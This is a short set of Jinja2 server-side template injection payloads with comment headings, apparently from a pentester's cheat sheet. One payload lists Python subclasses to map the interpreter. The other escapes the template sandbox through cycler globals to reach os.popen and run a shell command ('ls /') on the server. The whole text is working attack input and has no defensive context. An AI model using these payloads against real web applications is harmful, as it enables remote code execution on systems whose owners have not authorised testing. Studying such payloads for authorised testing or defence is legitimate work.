#ALL AVAILABLE CLASSES
{{ "".__class__.__mro__[1].__subclasses__() }}

#READ ALL DIRECTORIES IN / PARTITION
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("ls /").read() }}
